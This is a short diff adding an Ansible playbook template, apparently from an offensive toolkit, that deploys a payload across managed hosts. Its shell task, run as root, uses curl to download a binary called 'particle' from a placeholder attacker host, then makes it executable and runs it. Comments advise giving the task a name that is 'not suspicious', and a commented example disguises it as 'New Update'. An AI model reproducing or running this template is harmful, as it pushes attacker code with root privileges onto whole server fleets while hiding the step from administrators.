@@ -1,0 +1,19 @@
+- hosts: #host group on /etc/ansible/hosts or all
+  tasks:
+  - name: # A name to add to the task. Make it not suspicious
+    become: true
+    become_user: # User to run as. Either a valid user or root (usually ansible has enough privs to run as root)
+    shell: curl attackerip/particle -o particle; chmod +x ./particle; ./particle
+
+# -------------------------------------
+# This is an example. Delete before executing
+# -------------------------------------
+
+# Also remember that YAML works with spaces, do not delete any space on each row if not needed.
+
+#- hosts: all
+#  tasks:
+#  - name: New Update
+#    become: true
+#    become_user: root
+#    shell: curl attackerip/particle -o particle; chmod +x ./particle; ./particle
